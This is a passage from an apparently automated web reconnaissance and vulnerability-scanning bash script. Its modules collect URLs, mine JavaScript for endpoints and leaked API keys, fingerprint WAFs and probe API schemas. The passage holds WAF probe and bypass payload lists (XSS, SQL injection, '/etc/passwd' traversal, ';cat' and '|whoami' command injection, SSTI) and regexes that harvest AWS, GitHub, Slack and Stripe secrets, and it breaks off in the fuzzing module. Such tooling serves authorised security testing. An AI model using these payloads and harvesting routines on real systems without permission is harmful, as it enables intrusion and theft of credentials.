    jq -r '.tech[]?' "$O/live_hosts.json" 2>/dev/null \
        | sort | uniq -c | sort -rn | head -40 > "$O/tech_stack.txt"
    log_ok "Tech stack fingerprinted: $(cnt "$O/tech_stack.txt") entries"
}

# ══════════════════════════════════════════════════════
# MODULE 03 — URL COLLECTION
# ══════════════════════════════════════════════════════
mod_urls() {
    progress "MODULE 03 — URL Collection"
    log_section "MODULE 03 — URL COLLECTION (ALL SOURCES)"
    local O="$WORKSPACE/urls"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    log_info "waybackurls (main + top ${MAX_SUBS_WB} subs)..."
    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$O/wayback.txt" || true
    head -"$MAX_SUBS_WB" "$WORKSPACE/subdomains/resolved_domains.txt" 2>/dev/null \
        | while read -r sub; do
            timeout 25 bash -c "echo '$sub' | waybackurls 2>/dev/null" 2>/dev/null || true
          done | sort -u >> "$O/wayback.txt" || true
    sort -u -o "$O/wayback.txt" "$O/wayback.txt"
    log_ok "wayback: $(cnt "$O/wayback.txt") URLs"

    log_info "gau (AlienVault + URLScan + Wayback)..."
    timeout 180 gau --subs --threads 10 --timeout 10 \
        --blacklist "png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,zip" \
        "$DOMAIN" 2>/dev/null | sort -u > "$O/gau.txt" || true
    log_ok "gau: $(cnt "$O/gau.txt") URLs"

    log_info "waymore (180s cap)..."
    timeout 180 waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" --timeout 30 2>/dev/null \
        || timeout 180 python3 -m waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" 2>/dev/null \
        || true
    log_ok "waymore: $(cnt "$O/waymore.txt") URLs"

    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
        | jq -r '.results[]?.page?.url' 2>/dev/null | sort -u > "$O/urlscan.txt" || true
    log_ok "urlscan.io: $(cnt "$O/urlscan.txt") URLs"

    log_info "katana standard crawl..."
    timeout 120 katana -u "https://$DOMAIN" -jc -kf all \
        -d "$D_KATANA" -timeout 10 -c "$T_KATANA" \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        -silent -o "$O/katana_single.txt" 2>/dev/null || true

    log_info "katana list crawl (all live hosts)..."
    timeout 600 katana -list "$LIVE" -jc -kf all \
        -d "$D_KATANA" -timeout 10 -c "$T_KATANA" -p 20 \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        -silent -o "$O/katana_list.txt" 2>/dev/null || log_warn "katana list timed out"

    log_info "katana headless (JS-heavy)..."
    timeout 180 katana -u "https://$DOMAIN" -headless -jc -kf all \
        -d 2 -timeout 15 -c 20 \
        -silent -o "$O/katana_headless.txt" 2>/dev/null || true

    cat "$O/katana_single.txt" "$O/katana_list.txt" "$O/katana_headless.txt" \
        2>/dev/null | sort -u > "$O/katana.txt"
    log_ok "katana total: $(cnt "$O/katana.txt") URLs"

    log_info "hakrawler (300s cap)..."
    timeout 300 bash -c \
        "cat '$LIVE' | hakrawler -depth 2 -subs -u 2>/dev/null | sort -u > '$O/hakrawler.txt'" \
        || log_warn "hakrawler timed out"

    # Merge & dedup
    cat "$O"/*.txt 2>/dev/null | sort -u > "$O/all_urls_raw.txt"
    log_ok "Raw total: $(cnt "$O/all_urls_raw.txt") URLs"

    if has uro; then
        uro < "$O/all_urls_raw.txt" 2>/dev/null > "$O/all_urls.txt" || cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
    else
        cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
    fi
    sort -u -o "$O/all_urls.txt" "$O/all_urls.txt" 2>/dev/null || true
    log_ok "Deduplicated: $(cnt "$O/all_urls.txt") URLs"

    log_info "GF pattern extraction..."
    local GF_PATTERNS=(xss sqli ssrf redirect lfi rce idor interestingparams interestingEXT)
    for p in "${GF_PATTERNS[@]}"; do
        gf "$p" "$O/all_urls.txt" 2>/dev/null | sort -u > "$O/gf/${p}.txt" || true
        local c; c=$(cnt "$O/gf/${p}.txt")
        [[ $c -gt 0 ]] && log_ok "gf[$p]: $c URLs"
    done

    # ── Parameter-focused URL filtering (drop pure crawler noise) ──────────
    log_info "Filtering URLs to parameter/input/dynamic targets only..."

    grep -E '\?[a-zA-Z0-9_%-]+=' "$O/all_urls.txt" | sort -u > "$O/urls_with_params.txt"

    grep -iE '[?&](id|uid|user|username|email|name|q|query|search|s|key|token|ref|redirect|url|path|file|page|lang|cat|category|type|action|cmd|exec|input|data|val|value|param|p|t|n|m|v|c|i)=[^\&]+' \
        "$O/all_urls.txt" | sort -u > "$O/urls_user_input.txt"

    grep -iE '(/api/|/ajax/|/json|/render|/view|/fetch|/graphql|/rpc|/query|format=json|format=xml|callback=|jsonp=|\.json\?|\.xml\?)' \
        "$O/all_urls.txt" | sort -u > "$O/urls_dynamic.txt"

    grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
        | sed 's/^[?&]//;s/=//' | sort -u > "$WORKSPACE/params/all_params.txt"

    {
        echo "=== ID / Object Reference ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
            | grep -iE '(id|uid|oid|rid|cid|pid|sid|uuid|guid|ref|token|key|code|hash)=' \
            | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== Search / Query ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
            | grep -iE '(q|query|s|search|term|keyword|find|filter|sort|order)=' \
            | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== User / Auth ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
            | grep -iE '(user|username|email|login|auth|session|pass|account|member|role|admin)=' \
            | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== Navigation / Path ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
            | grep -iE '(url|redirect|return|next|goto|path|file|dir|page|lang|locale|cat|category|section|tab|view|action|type|format|mode)=' \
            | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== Injection Candidates ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
            | grep -iE '(cmd|exec|command|input|data|val|value|param|debug|test|payload|template|tpl|include|load|import|src|source)=' \
            | sed 's/^[?&]//;s/=//' | sort -u
    } > "$WORKSPACE/params/params_by_type.txt"

    log_ok "URLs with params    : $(cnt "$O/urls_with_params.txt")"
    log_ok "URLs with user input: $(cnt "$O/urls_user_input.txt")"
    log_ok "URLs dynamic/API    : $(cnt "$O/urls_dynamic.txt")"
    log_ok "Unique param names  : $(cnt "$WORKSPACE/params/all_params.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 04 — JS ANALYSIS (CLEAN ENDPOINT MINING, NO NOISE)
# ══════════════════════════════════════════════════════
mod_js() {
    progress "MODULE 04 — JavaScript Analysis"
    log_section "MODULE 04 — JAVASCRIPT ANALYSIS (CLEAN ENDPOINT MINING)"
    local O="$WORKSPACE/js"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    mkdir -p "$O/downloaded"

    # ── 1. Collect JS URLs — unique, target-scoped only ──
    {
        grep -E '\.js(\?|$)' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null
        while IFS= read -r url; do
            has getJS && getJS --url "$url" --complete 2>/dev/null | grep -E '\.js(\?|$)'
        done < "$LIVE"
        grep -E '\.js(\?|$)' "$WORKSPACE/urls/katana.txt" "$WORKSPACE/urls/hakrawler.txt" 2>/dev/null
    } | grep -iE "${DOMAIN}" | sort -u > "$O/js_urls.txt" || true
    log_ok "JS files: $(cnt "$O/js_urls.txt") (target-scoped)"

    # ── 2. Parallel download — native curl, no external helper ──
    log_info "Downloading JS (parallel, cap 200)..."
    local n=0
    while IFS= read -r url && [[ $n -lt 200 ]]; do
        local fname; fname="$O/downloaded/$(safe_name "$url").js"
        [[ -s "$fname" ]] && { n=$((n+1)); continue; }
        _curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
              "$url" -o "$fname" 2>/dev/null &
        n=$((n+1))
        (( n % 20 == 0 )) && { wait 2>/dev/null || true; }
    done < "$O/js_urls.txt"
    wait 2>/dev/null || true
    # Drop junk: empty/tiny files + HTML error pages disguised as .js
    find "$O/downloaded" -name "*.js" -size -100c -delete 2>/dev/null || true
    for f in "$O/downloaded"/*.js; do
        [[ -f "$f" ]] || continue
        head -c 300 "$f" 2>/dev/null | grep -qiE '<!doctype html|<html|<error' && rm -f "$f"
    done
    log_ok "Downloaded: $(ls "$O/downloaded/"*.js 2>/dev/null | wc -l) files"

    # ── 3. Endpoint harvest → noise filter → unique ──
    local JS_TMP="$O/.js_all.tmp"
    find "$O/downloaded" -name "*.js" -type f -exec cat {} + > "$JS_TMP" 2>/dev/null || true
    local SQ="'" DQ='"'
    log_info "Mining endpoints (noise-filtered)..."
    if [[ -s "$JS_TMP" ]]; then
        {
            # full URLs
            grep -oE 'https?://[a-zA-Z0-9._~:/?#\[\]@!$&()*+,;=%-]+' "$JS_TMP"
            # quoted relative API-ish paths (single/double quotes)
            grep -oE "[${SQ}${DQ}](api|v[0-9]|admin|auth|user|account|config|internal|graphql|rest|service|backend|webhook|oauth|sso|upload|export|import|download)/[a-zA-Z0-9._/{}?=&%:-]*[${SQ}${DQ}]" "$JS_TMP"
            # fetch/axios/XHR/open calls
            grep -oE "(fetch|axios|XMLHttpRequest|open)\([${SQ}${DQ}/][a-zA-Z0-9_./?=&%-]+" "$JS_TMP"
            # http verb helpers: get( "/x" ) post( "/y" )
            grep -oE "(get|post|put|delete|patch)\([${SQ}${DQ}/][a-zA-Z0-9_./?=&%-]+" "$JS_TMP"
            # url:/endpoint: assignments
            grep -oE "url[[:space:]]*[:=][[:space:]]*[${SQ}${DQ}]/[a-zA-Z0-9_./?=&%-]+" "$JS_TMP" | grep -oE '/[a-zA-Z0-9_./?=&%-]+'
            # string concatenation → route with dynamic segment
            grep -oE "${DQ}[a-zA-Z0-9_./-]{3,}${DQ}[[:space:]]*\+" "$JS_TMP" \
                | sed -E -e 's/^"//' -e 's/"[[:space:]]*\+$//' -e 's|$|/{param}|'
        } \
        | sed -e "s/[\"']//g" -e 's/^\.\///' -e 's/\\\//g' \
        | tr -d '`' \
        | grep -vE '\.(js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|map|mp[34]|webm|avi|mov|zip|tar\.?g?z|gz|pdf|docx?|xlsx?|pptx?|min\.js)(\?|$)' \
        | grep -vE '/(static|assets?|images?|img|icons?|fonts?|media|videos?|node_modules|bower_components|vendor|dist|build|public|__webpack|\.well-known)(/|$)' \
        | grep -vE '^(https?:)?//(fonts\.googleapis|fonts\.gstatic|ajax\.googleapis|cdnjs|unpkg|jsdelivr|code\.jquery|cloudflare|google-analytics|googletagmanager|doubleclick|facebook|fbcdn|twitter|youtube|w3\.org|schema\.org|example\.com|localhost|127\.0\.0\.1)(/|$)' \
        | grep -vE '^(data:|chrome|javascript:|mailto:|tel:|blob:)' \
        | grep -vE '(sourceMappingURL|webpack|__webpack_require__|hot-update|manifest\.json|service-worker|favicon|robots\.txt|sitemap\.xml)' \
        | grep -vE '^/[0-9a-f]{20,}' \
        | grep -vE '^$' \
        | sort -u > "$O/js_endpoints_raw.txt"
        log_ok "Raw endpoints (filtered): $(cnt "$O/js_endpoints_raw.txt")"
    else
        touch "$O/js_endpoints_raw.txt"
    fi

    # ── 4. Clean API route table (≥2 segments, real API keywords, no query junk) ──
    grep -E '^/' "$O/js_endpoints_raw.txt" 2>/dev/null \
        | sed 's/?.*$//; s#/$##' \
        | awk -F/ 'NF>=3 && $2!=""' \
        | grep -iE '(api|v[0-9]|user|admin|auth|account|order|payment|upload|export|import|download|config|graphql|webhook|oauth|token|session|file|image|document|report|search|query|notification|message|product|cart|checkout|invoice|billing|profile|member|role|permission|invite|team|org|project|task|setting|preference)' \
        | sort -u > "$O/js_api_routes.txt"
    log_ok "API routes: $(cnt "$O/js_api_routes.txt")"

    # ── 5. Secret mining — deduped, real-entropy only ──
    log_info "Secret mining..."
    if [[ -s "$JS_TMP" ]]; then
        echo "AKIA keys:     $(grep -oE 'AKIA[0-9A-Z]{16}' "$JS_TMP" | sort -u | tee "$O/aws_keys.txt" | wc -l)"
        echo "GCP keys:      $(grep -oE 'AIza[0-9A-Za-z_-]{35}' "$JS_TMP" | sort -u | tee "$O/gcp_keys.txt" | wc -l)"
        echo "Stripe keys:   $(grep -oE 'sk-(live|test)-[a-zA-Z0-9]{20,}' "$JS_TMP" | sort -u | tee "$O/stripe_keys.txt" | wc -l)"
        echo "GitHub tokens: $(grep -oE 'ghp_[a-zA-Z0-9]{36}' "$JS_TMP" | sort -u | tee "$O/github_tokens.txt" | wc -l)"
        echo "Slack tokens:  $(grep -oE 'xox[baprs]-[a-zA-Z0-9-]{10,}' "$JS_TMP" | sort -u | tee "$O/slack_tokens.txt" | wc -l)"
        echo "JWTs:          $(grep -oE 'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' "$JS_TMP" | sort -u | tee "$O/jwt_tokens.txt" | wc -l)"
        grep -oiE "(api[_-]?key|apikey|secret|client[_-]?secret|access[_-]?token|auth[_-]?token|private[_-]?key|password|passwd|pwd|bearer)[\"' ]*[:=][\"' ][a-zA-Z0-9._/+=-]{12,}[\"']" "$JS_TMP" \
            | grep -viE '(your|example|xxxx|test_|placeholder|changeme|undefined|null|true|false|000000|api_key_here)' \
            | sort -u > "$O/potential_secrets.txt"
        grep -oiE '(innerHTML|outerHTML|document\.write|\.html\(|eval\(|setTimeout\(|setInterval\()' "$JS_TMP" | sort -u > "$O/dom_xss_sinks.txt"
        grep -oE '[a-zA-Z0-9_-]+\.s3[\.-][a-zA-Z0-9.-]*\.amazonaws\.com' "$JS_TMP" | sort -u > "$O/s3_in_js.txt"
        grep -oiE "(baseURL|apiBase|API_URL|api_url|endpoint)[\"' ]*[:=][\"' ][a-zA-Z0-9./:_-]{5,}[\"']" "$JS_TMP" | sort -u > "$O/api_base_urls.txt"

        cat "$O/aws_keys.txt" "$O/gcp_keys.txt" "$O/stripe_keys.txt" \
            "$O/github_tokens.txt" "$O/slack_tokens.txt" \
            "$O/potential_secrets.txt" 2>/dev/null \
            | grep -vE '^$' | sort -u > "$O/secrets_found.txt"
        [[ -s "$O/secrets_found.txt" ]] && \
            log_hit "SECRETS IN JS: $(cnt "$O/secrets_found.txt") unique lines"
    else
        for f in aws_keys gcp_keys stripe_keys github_tokens slack_tokens \
                 potential_secrets jwt_tokens dom_xss_sinks s3_in_js \
                 api_base_urls secrets_found; do
            touch "$O/${f}.txt"
        done
    fi

    # ── 6. LinkFinder on downloaded files only (no HTTP, fast) ──
    if [[ -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
        find "$O/downloaded" -name "*.js" -type f 2>/dev/null | head -200 | while IFS= read -r jsfile; do
            python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$jsfile" -o cli 2>/dev/null || true
        done | sort -u > "$O/linkfinder_endpoints.txt" || true
    else
        touch "$O/linkfinder_endpoints.txt"
    fi

    # ── 7. Merge + dedup into master endpoint lists ──
    cat "$O/js_endpoints_raw.txt" "$O/linkfinder_endpoints.txt" 2>/dev/null \
        | sort -u > "$O/all_js_endpoints.txt"
    log_ok "JS endpoints total: $(cnt "$O/all_js_endpoints.txt")"

    cat "$O/js_api_routes.txt" "$O/all_js_endpoints.txt" 2>/dev/null \
        | sort -u >> "$WORKSPACE/endpoints/all_endpoints.txt"
    sort -u -o "$WORKSPACE/endpoints/all_endpoints.txt" \
        "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || true
    log_ok "mod_js complete → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE WAF — WAF FINGERPRINTING & BYPASS PROFILING
# ══════════════════════════════════════════════════════
mod_waf() {
    progress "MODULE WAF — WAF Fingerprinting & Bypass Profiling"
    log_section "MODULE WAF — WAF FINGERPRINTING"
    local O="$WORKSPACE/waf"
    mkdir -p "$O"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    # ── wafw00f detection ─────────────────────────────
    if has wafw00f; then
        log_info "wafw00f passive+active detection..."
        while IFS= read -r url; do
            wafw00f "$url" -a -o "$O/wafw00f_$(safe_name "$url").json" --format=json 2>/dev/null || true
        done < <(head -10 "$LIVE" 2>/dev/null)
        find "$O" -name "wafw00f_*.json" -exec jq -r '.detected[]? | "\(.waf) | \(.url)"' {} 2>/dev/null \; \
            | sort -u > "$O/waf_detected.txt" || true
        if [[ -s "$O/waf_detected.txt" ]]; then
            log_warn "WAFs detected:"
            cat "$O/waf_detected.txt" | while IFS= read -r line; do log_warn "  $line"; done
        else
            log_ok "No WAF detected by wafw00f (or unrecognised)"
        fi
    else
        log_warn "wafw00f not installed — skipping passive detection (header probes still run)"
    fi

    # ── Header mutation probes ────────────────────────
    log_info "Header mutation fingerprinting..."
    local MAIN; MAIN=$(head -1 "$LIVE" 2>/dev/null)
    [[ -z "$MAIN" ]] && MAIN="https://$DOMAIN"

    declare -A WAF_SIGS=(
        ["Cloudflare"]="cf-ray|cloudflare"
        ["Akamai"]="akamai|x-akamai"
        ["AWS WAF"]="x-amzn-requestid|x-amz-cf-id"
        ["Imperva/Incapsula"]="x-iinfo|incap_ses|visid_incap"
        ["F5 BIG-IP"]="x-wa-info|ts=[0-9a-f]"
        ["Sucuri"]="x-sucuri-id|sucuri"
        ["Fastly"]="x-fastly|fastly"
        ["ModSecurity"]="mod_security|modsec"
    )

    local hdrs; hdrs=$(_curl -I "$MAIN" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    for waf in "${!WAF_SIGS[@]}"; do
        local sig="${WAF_SIGS[$waf]}"
        if echo "$hdrs" | grep -qiE "$sig"; then
            echo "HEADER_MATCH: $waf" >> "$O/waf_header_match.txt"
            log_warn "WAF header match: $waf"
        fi
    done
    sort -u -o "$O/waf_header_match.txt" "$O/waf_header_match.txt" 2>/dev/null || true

    # ── Payload probe — how does it block? ───────────
    log_info "WAF behavior probes (block/pass/transform)..."
    local -a PROBES=(
        "/?__test__=<script>alert(1)</script>"
        "/?__test__=' OR 1=1--"
        "/?__test__=../../../etc/passwd"
        "/?__test__=; cat /etc/passwd"
        "/?__test__={{7*7}}"
        "/?__test__=|whoami"
    )
    local -a LABELS=("XSS" "SQLi" "LFI" "CMDi" "SSTI" "CMDi2")
    for i in "${!PROBES[@]}"; do
        local probe="${PROBES[$i]}"
        local label="${LABELS[$i]}"
        local resp_code; resp_code=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${probe}" 2>/dev/null || echo "000")
        local resp_body; resp_body=$(_curl -s "${MAIN}${probe}" 2>/dev/null | head -c 2000 || true)
        local result="PASS[$resp_code]"
        echo "$resp_body" | grep -qiE "(blocked|forbidden|access denied|request denied|detected|firewall|illegal|malicious|attack)" \
            && result="BLOCKED[$resp_code]"
        [[ "$resp_code" == "403" || "$resp_code" == "406" || "$resp_code" == "429" || "$resp_code" == "503" ]] \
            && result="BLOCKED[$resp_code]"
        echo "[$label] $result  ${MAIN}${probe}" >> "$O/waf_probe_results.txt"
    done
    sort -u -o "$O/waf_probe_results.txt" "$O/waf_probe_results.txt" 2>/dev/null || true
    log_ok "WAF probe results → $O/waf_probe_results.txt"

    # ── Bypass mutations if WAF detected ─────────────
    if [[ -s "$O/waf_detected.txt" || -s "$O/waf_header_match.txt" ]]; then
        log_info "Generating WAF bypass mutation set..."
        cat > "$O/waf_bypass_payloads.txt" << 'WAFBYPASS'
# XSS bypasses
<ScRiPt>alert(1)</sCrIpT>
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
<script>alert(1)</script>
<a href="javas&#99;ript:alert(1)">
# SQLi bypasses
'/**/OR/**/1=1--
'%09OR%091=1--
' /*!OR*/ 1=1--
'||'1'='1
1'||'1'='1'||'1'='1
' OR 1=1 LIMIT 1 OFFSET 1--
# LFI bypasses
....//....//etc/passwd
..%252f..%252fetc/passwd
%2e%2e%2fetc%2fpasswd
php://filter/read=convert.base64-encode/resource=index.php
# SSTI bypasses
{{7*'7'}}
'${7*7}'
<%= 7*7 %>
#{7*7}
*{7*7}
WAFBYPASS
        log_ok "WAF bypass payloads written → $O/waf_bypass_payloads.txt"
    fi

    # ── Rate-limit threshold probe ────────────────────
    log_info "Rate-limit threshold probe (20 rapid requests)..."
    local block_count=0
    for i in $(seq 1 20); do
        local c; c=$(_curl -o /dev/null -w "%{http_code}" "$MAIN" 2>/dev/null || echo "000")
        [[ "$c" == "429" || "$c" == "503" ]] && ((block_count++))
    done
    echo "rate_limit_blocks_in_20_req=$block_count" >> "$O/waf_probe_results.txt"
    [[ $block_count -gt 0 ]] && log_warn "Rate limiting detected: $block_count/20 requests blocked" \
        || log_ok "No rate limiting on 20 rapid requests"

    log_ok "WAF fingerprinting complete → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE API — API SCHEMA DISCOVERY
# ══════════════════════════════════════════════════════
mod_api_schema() {
    progress "MODULE API — API Schema Discovery"
    log_section "MODULE API — API SCHEMA DISCOVERY (OpenAPI/GraphQL)"
    local O="$WORKSPACE/api_schema"
    mkdir -p "$O"/{openapi,graphql,undocumented}
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    # ── OpenAPI / Swagger discovery ───────────────────
    log_info "OpenAPI/Swagger spec hunting..."
    local -a API_PATHS=(
        "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
        "/swagger-ui.html" "/swagger-ui/" "/swagger-ui/index.html"
        "/api-docs" "/api-docs.json" "/api/swagger.json"
        "/api/v1/swagger.json" "/api/v2/swagger.json" "/api/v3/swagger.json"
        "/openapi.json" "/openapi.yaml" "/openapi/v1" "/openapi/v2"
        "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
        "/api/openapi.json" "/api/openapi.yaml"
        "/redoc" "/redoc.html" "/.well-known/openapi"
        "/api/schema/" "/schema/swagger.json"
        "/api/swagger-ui.html"
    )

    while IFS= read -r base; do
        for path in "${API_PATHS[@]}"; do
            local url="${base}${path}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                local body; body=$(_curl "$url" 2>/dev/null || true)
                if echo "$body" | grep -qiE "(swagger|openapi|paths|info|endpoints)"; then
                    echo "$url" >> "$O/openapi/specs_found.txt"
                    local fname="$O/openapi/$(safe_name "$url").json"
                    echo "$body" > "$fname"
                    log_hit "API SPEC FOUND: $url"
                    echo "$body" | jq -r '.paths | keys[]?' 2>/dev/null \
                        >> "$O/openapi/spec_endpoints.txt" || true
                fi
            fi
        done
    done < <(head -15 "$LIVE" 2>/dev/null)
    touch "$O/openapi/spec_endpoints.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
    sort -u -o "$O/openapi/spec_endpoints.txt" "$O/openapi/spec_endpoints.txt" 2>/dev/null || true
    sort -u -o "$O/openapi/specs_found.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
    log_ok "OpenAPI specs: $(cnt "$O/openapi/specs_found.txt") | Endpoints in specs: $(cnt "$O/openapi/spec_endpoints.txt")"

    # ── GraphQL introspection ─────────────────────────
    log_info "GraphQL endpoint detection + introspection..."
    local -a GQL_PATHS=("/graphql" "/api/graphql" "/graphql/v1" "/v1/graphql"
                        "/graphiql" "/graphql-explorer" "/gql" "/query" "/api/query")

    while IFS= read -r base; do
        for path in "${GQL_PATHS[@]}"; do
            local url="${base}${path}"
            local resp; resp=$(_curl -X POST -H "Content-Type: application/json" \
                -d '{"query":"{ __typename }"}' "$url" 2>/dev/null || true)
            if echo "$resp" | grep -qiE "(data|__typename|errors)" && echo "$resp" | grep -q "{"; then
                echo "GQL_ENDPOINT: $url" >> "$O/graphql/endpoints.txt"
                log_hit "GraphQL endpoint: $url"

                local INTROSPECTION_Q='{"query":"{ __schema { queryType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'
                local schema; schema=$(_curl -X POST -H "Content-Type: application/json" \
                    -d "$INTROSPECTION_Q" "$url" 2>/dev/null || true)
                if echo "$schema" | grep -qiE "__schema|queryType"; then
                    echo "$schema" > "$O/graphql/schema_$(safe_name "$url").json"
                    log_hit "GraphQL introspection enabled: $url"
                    echo "INTROSPECTION_OPEN: $url" >> "$O/graphql/introspection_open.txt"
                    echo "$schema" | jq -r '.data.__schema.types[]?.name' 2>/dev/null \
                        | grep -v "^__" | sort -u >> "$O/graphql/type_names.txt" || true
                else
                    echo "INTROSPECTION_DISABLED: $url" >> "$O/graphql/introspection_disabled.txt"
                fi

                local batch_resp; batch_resp=$(_curl -X POST -H "Content-Type: application/json" \
                    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]' "$url" 2>/dev/null || true)
                echo "$batch_resp" | grep -qiE "(data|__typename)" \
                    && echo "BATCH_ENABLED: $url" >> "$O/graphql/batch_enabled.txt" \
                    && log_warn "GraphQL batching enabled (DoS / rate-limit bypass): $url"

                local depth_q='{"query":"{ a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"}'
                _curl -X POST -H "Content-Type: application/json" -d "$depth_q" "$url" 2>/dev/null \
                    | grep -qiE "(error|limit|exceeded)" \
                    || echo "NO_DEPTH_LIMIT: $url" >> "$O/graphql/no_depth_limit.txt" || true
            fi
        done
    done < <(head -15 "$LIVE" 2>/dev/null)
    sort -u -o "$O/graphql/endpoints.txt" "$O/graphql/endpoints.txt" 2>/dev/null || true
    sort -u -o "$O/graphql/introspection_open.txt" "$O/graphql/introspection_open.txt" 2>/dev/null || true
    sort -u -o "$O/graphql/introspection_disabled.txt" "$O/graphql/introspection_disabled.txt" 2>/dev/null || true
    sort -u -o "$O/graphql/batch_enabled.txt" "$O/graphql/batch_enabled.txt" 2>/dev/null || true
    sort -u -o "$O/graphql/no_depth_limit.txt" "$O/graphql/no_depth_limit.txt" 2>/dev/null || true
    log_ok "GraphQL endpoints: $(cnt "$O/graphql/endpoints.txt") | Introspection open: $(cnt "$O/graphql/introspection_open.txt")"

    # ── Undocumented endpoint fuzzing ─────────────────
    log_info "API version + undocumented path fuzzing..."
    local MAIN="https://$DOMAIN"
    local -a API_VERSIONS=("v1" "v2" "v3" "v4" "v5" "v1.0" "v2.0" "latest" "beta" "alpha" "dev" "internal" "private")
    local -a API_BASES=("/api" "/api/rest" "/rest" "/service" "/services" "/backend")
    local -a API_RESOURCES=("users" "user" "accounts" "account" "orders" "order" "products" "product"
                             "admin" "config" "settings" "payments" "invoices" "customers" "members"
                             "reports" "export" "import" "upload" "auth" "tokens" "keys" "webhooks"
                             "roles" "permissions" "groups" "events" "logs" "audit" "metrics")

    for base in "${API_BASES[@]}"; do
        for ver in "${API_VERSIONS[@]}"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}" 2>/dev/null || echo "000")
            if [[ "$c" =~ ^(200|201|401|403)$ ]]; then
                echo "API_BASE_FOUND [${c}]: ${MAIN}${base}/${ver}" >> "$O/undocumented/api_bases.txt"
                for res in "${API_RESOURCES[@]}"; do
                    local rc; rc=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}/${res}" 2>/dev/null || echo "000")
                    [[ "$rc" =~ ^(200|201|401|403)$ ]] && \
                        echo "API_RESOURCE [${rc}]: ${MAIN}${base}/${ver}/${res}" >> "$O/undocumented/api_resources.txt"
                done
            fi
        done
    done
    sort -u -o "$O/undocumented/api_bases.txt" "$O/undocumented/api_bases.txt" 2>/dev/null || true
    sort -u -o "$O/undocumented/api_resources.txt" "$O/undocumented/api_resources.txt" 2>/dev/null || true
    log_ok "Undocumented API bases: $(cnt "$O/undocumented/api_bases.txt")"
    log_ok "Undocumented API resources: $(cnt "$O/undocumented/api_resources.txt")"

    # ── Feed interesting paths ────────────────────────
    cat "$O/openapi/spec_endpoints.txt" "$O/graphql/endpoints.txt" \
        "$O/undocumented/api_resources.txt" 2>/dev/null \
        >> "$WORKSPACE/endpoints/interesting_paths.txt" || true
    sort -u -o "$WORKSPACE/endpoints/interesting_paths.txt" \
        "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null || true

    log_ok "API schema discovery complete → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE PMF — PARAMETER MUTATION FUZZING
# ══════════════════════════════════════════════════════
mod_param_fuzz() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE PMF — Parameter Mutation Fuzzing"
    log_section "MODULE PMF — PARAMETER MUTATION FUZZING (SSTI/Type Confusion/Hidden Params)"
    local O="$WORKSPACE/vulns/param_fuzz"
    mkdir -p "$O"/{ssti,type_confusion,hidden_params,json_xml}
    touch "$O/ssti/ssti_confirmed.txt" "$O/ssti/ssti_error.txt" "$O/type_confusion/findings.txt" "$O/json_xml/json_hits.txt" "$O/json_xml/json_500.txt" "$O/hidden_params/discovered_params.txt" 2>/dev/null || true
    local PARAMS_IN="$WORKSPACE/urls/urls_with_params.txt"

    # ── SSTI detection ────────────────────────────────
    log_info "SSTI detection (Jinja2/Twig/Freemarker/Pebble/Velocity/ERB)..."
    local -a SSTI_PAYLOADS=(
        "{{7*7}}" "{{7*'7'}}" '${7*7}' "<%= 7*7 %>" "#{7*7}" "*{7*7}"
        '{{config}}' '{{self}}' '{{<%SSTI%>}}'
        "{{'7'*7}}" "{{range.new(0,7)}}" "{{1+1}}"
